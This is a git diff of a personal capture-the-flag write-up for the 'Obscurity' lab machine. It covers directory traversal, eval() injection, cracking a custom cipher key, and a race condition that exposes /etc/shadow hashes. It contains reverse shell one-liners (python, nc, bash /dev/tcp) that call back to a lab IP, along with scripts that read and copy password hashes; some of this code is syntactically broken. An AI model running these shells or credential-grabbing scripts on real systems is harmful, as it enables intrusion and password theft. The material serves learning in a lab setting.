@@ -1,4 +1,4 @@
-# Machine #[NUMBER] [NAME]  
+# Machine #13 Obscurity  
 
 
 ## Nmap Results  
@@ -120,6 +120,92 @@ http-title: 0bscura
   A closed port is accessible (it receives and responds to Nmap probe packets), but there is no application listening on it.
   </blockquote>
 
+
+¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v  
+Encrypting this file with your key should result in out.txt, make sure your key is correct!
+
+python3 SuperSecureCrypt.py -d -i passwordreminder.txt -o /tmp/decryptTest -k alexandrovich 
+
+* Robert's password  
+SecThruObsFTW
+
+
+* My code to get the key  
+
+```python
+# Online Python compiler (interpreter) to run Python online.
+# Write Python 3 code in this online editor and run it.
+plainText = ""
+# put same space in cypher text as in plain text
+cypherText = ""
+
+keyPos = 0
+key = ""
+for x in cypherText:
+    plainTextOrd = ord(plainText[keyPos])
+    cypherTextOrd = ord(x)
+    newChr = cypherTextOrd - plainTextOrd
+    key += chr(newChr)
+    keyPos += 1
+print(key)
+```  
+
+* Make sure that the code is working.  
+
+
+```
+python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.61",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+```
+
+[Configuration]
+AdminIdentities=unix-user:0
+[Configuration]
+AdminIdentities=unix-group:sudo;unix-group:admin
+
+
+```python
+# Try 1
+#!/env/.../python forgot
+while True:
+  if len(os.listDir('/tmp/SSH')) > 0:
+    with open('/etc/shadow', 'r') as f:
+    data = f.readlines()
+    data = [(p.split(":") if "$" in p else None) for p in data]
+    passwords = []
+    for x in data:
+    if not x == None:
+      passwords.append(x)
+
+    passwordFile = '\n'.join(['\n'.join(p) for p in passwords]) 
+    with open('/tmp/SSH/'+path, 'w') as f:
+    f.write(passwordFile)
+    break
+```
+
+
+* The code I used to get the contents of the file that has the contents of the shadow file before it gets removed  
+
+```python
+#!/usr/bin/env python3 
+  
+import os
+import time
+
+while True:
+    if len(os.listdir('/tmp/SSH')) > 0:
+        time.sleep(.05)
+        with open('/tmp/SSH/'+os.listdir('/tmp/SSH')[0], 'r') as f:
+            data = f.readlines()
+        passwords = []
+        for x in data:
+            if not x == None:
+                passwords.append(x)
+
+        #passwordFile = '\n'.join(['\n'.join(p) for p in passwords])
+        with open('/tmp/passes', 'w') as f:
+            f.write(passwords)
+        break
+```
 
 wfuzz -u http://10.129.1.140/ -H "Host: FUZZ.obscure.htb" -w /home/kali/Documents/cloned_reps/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --hh 11510   
 
@@ -306,17 +392,25 @@ else:
 
    <img src="https://images.lifesizecustomcutouts.com/image/cache/catalog/febProds21/SP000081-500x500.png" width=200 height=200>   
 
-
+1. First off we start with the web service, which was on port 8080 and port 80 was closed (As said by ippsec in his walkthrough it seems that in such cases we could be blocked by a firewall, IDS or something else I don't remember --get back and check it out).  
+The first interesting thing I found on the website was the file name that the developer stated had the source code of the server and the file extension `.py` indicated that the backend was written in python.  
+The second thing and after enumerating for a while I noticed a 500 Internal Server Error when you put `../../../../etc/passwd` it didn't give me not found which meant something. So I tried to put a path like `../../[SERVER SOURCE CODE FILE NAME]` and finally one of the paths worked without me knowing what is the name of the directory the code file is in.  
+2. So after getting the source code for the backend it wasn't that hard to exploit it by injecting the right code into the `eval()` function which resulted in a rev shell.
+3. While looking through the system for ways to priv esc we find that "Robert's" password is encrypted in some weird encryption algorithm and I have access to its code. So it wasn't hard to figure out the key, especially, that there was a test plain and cypher text that I was able to view which helped alot with the process of testing my cracking code.  
+4. After cracking the algo and getting roberts key "alexandrovich" or something the like, we get his password which allows us to SSH with his user. Which actually helped me with getting back to the machine, I remember having to do everything all over again if I just gained a rev shell without getting creds of one of the users.  
+5. I kind of got stuck on the root privilege escalation. Turns out there are 5 ways to do that. The way I used was that I wrote a python script to take advantage of the passwords file being written in a folder that I had all privileges on ( because I created it ). That was happening in this "BetterSSH" script.
      
 
 ## Where I Got Stuck?  
 
-* I got stuck on the privilege escalation part. It did not occur to me that it could be accomplished by writing a script right away.
+* I got stuck on the privilege escalation part. It did not occur to me that it could be accomplished by writing a script right away. I thought I had to kill the process before the file got deleted but another way was to 
    
 
 ## What Did I learn from this Machine?  
 
-* Directory Traversal
+* Directory Traversal.  
+
+* It's not always true to use custom made software. It does not mean that it's custom made then an attacker won't find a way of exploiting.  
 
 
 
@@ -327,101 +421,12 @@ else:
 
 
 
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.61 4444 >/tmp/f  
-
-nc -c bash 10.10.14.61 4444
-bash -i >& /dev/tcp/10.10.14.61/4444 0>&1
-
-bash -i >& /dev/tcp/10.10.14.61/1234 0>&1  
 
 
 
-¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v  
-Encrypting this file with your key should result in out.txt, make sure your key is correct!
-
-python3 SuperSecureCrypt.py -d -i passwordreminder.txt -o /tmp/decryptTest -k alexandrovich 
-
-* Robert's password  
-SecThruObsFTW
-
-
-* My code to get the key  
-
-```python
-# Online Python compiler (interpreter) to run Python online.
-# Write Python 3 code in this online editor and run it.
-plainText = ""
-# put same space in cypher text as in plain text
-cypherText = ""
-
-keyPos = 0
-key = ""
-for x in cypherText:
-    plainTextOrd = ord(plainText[keyPos])
-    cypherTextOrd = ord(x)
-    newChr = cypherTextOrd - plainTextOrd
-    key += chr(newChr)
-    keyPos += 1
-print(key)
-```  
-
-* Make sure that the code is working.  
-
-
-```
-python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.61",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
-```
-
-[Configuration]
-AdminIdentities=unix-user:0
-[Configuration]
-AdminIdentities=unix-group:sudo;unix-group:admin
-
-
-```python
-# Try 1
-#!/env/.../python forgot
-while True:
-  if len(os.listDir('/tmp/SSH')) > 0:
-    with open('/etc/shadow', 'r') as f:
-    data = f.readlines()
-    data = [(p.split(":") if "$" in p else None) for p in data]
-    passwords = []
-    for x in data:
-    if not x == None:
-      passwords.append(x)
-
-    passwordFile = '\n'.join(['\n'.join(p) for p in passwords]) 
-    with open('/tmp/SSH/'+path, 'w') as f:
-    f.write(passwordFile)
-    break
-```
-
-
-* The code I used to get the contents of the file that has the contents of the shadow file before it gets removed  
-
-```python
-#!/usr/bin/env python3 
-  
-import os
-import time
-
-while True:
-    if len(os.listdir('/tmp/SSH')) > 0:
-        time.sleep(.05)
-        with open('/tmp/SSH/'+os.listdir('/tmp/SSH')[0], 'r') as f:
-            data = f.readlines()
-        passwords = []
-        for x in data:
-            if not x == None:
-                passwords.append(x)
-
-        #passwordFile = '\n'.join(['\n'.join(p) for p in passwords])
-        with open('/tmp/passes', 'w') as f:
-            f.write(passwords)
-        break
-```
 
 
 
-<!-- tagsss -->
+
+
+<!--@nested-tags:owasp_toptten/2_cryptographic_failure/obscurity,owasp_topten/3_injection/obscurity,directory_traversal/machines/Obscurity-->
